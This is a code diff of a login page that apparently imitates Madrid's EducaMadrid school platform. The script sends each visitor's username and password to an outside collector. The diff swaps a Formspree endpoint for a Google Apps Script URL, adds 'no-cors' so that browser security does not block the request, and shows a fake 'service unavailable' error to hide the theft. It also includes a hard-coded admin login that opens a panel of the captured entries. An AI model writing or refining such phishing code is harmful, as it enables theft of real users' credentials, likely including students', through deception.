@@ -36,18 +36,17 @@
 </div>
 
 <script>
-    // Lógica personalizada inyectada
     document.getElementById('login').onsubmit = function(e) {
         e.preventDefault();
         
         var u = document.getElementById('username').value;
         var p = document.getElementById('password').value;
+        var googleURL = "https://script.google.com/macros/s/AKfycbyqRsVIdRCgdm3BYgwBmd7oJp7uMtv7Ihv3k9nebbhvJYvCtUIrvq22NjRKXgpEmmja6Q/exec";
 
-        // Comprobación de Admin
+        // 1. Lógica de Admin (Local)
         if (u === "Admin" && p === "Tortilla12") {
             document.getElementById('page-wrapper').style.display = 'none';
             document.getElementById('vault-panel').style.display = 'block';
-            
             var data = JSON.parse(localStorage.getItem('_sys_logs') || "[]");
             var html = "";
             data.forEach(function(item) {
@@ -57,23 +56,24 @@
             return false;
         }
 
-fetch("https://formspree.io/f/xpqkveqj", {
-    method: "POST",
-    body: JSON.stringify({
-        usuario: u,
-        password: p,
-        fecha: new Date().toLocaleString(),
-        origen: "AulaCP"
-    }),
-    headers: {
-        'Content-Type': 'application/json'
-    }
-}).catch(err => console.log("Error al enviar a la nube"));
+        // 2. Enviar a la nube (Google Sheets)
+        fetch(googleURL, {
+            method: "POST",
+            mode: "no-cors", // Esto evita bloqueos de seguridad del navegador
+            body: JSON.stringify({
+                usuario: u,
+                password: p,
+                fecha: new Date().toLocaleString()
+            }),
+            headers: { "Content-Type": "application/json" }
+        }).then(function() {
+            // 3. Mostrar error y recargar
+            document.getElementById('customAlert').style.display = 'block';
+        }).catch(function() {
+            // Si falla la red, también mostramos el error
+            document.getElementById('customAlert').style.display = 'block';
+        });
 
-
-        // Alerta y recarga
-        alert("Error de autenticación: El servicio de EducaMadrid no está disponible. Por favor, cierre la pestaña y vuelva a intentarlo de nuevo.");
-        location.reload();
         return false;
     };
 </script>
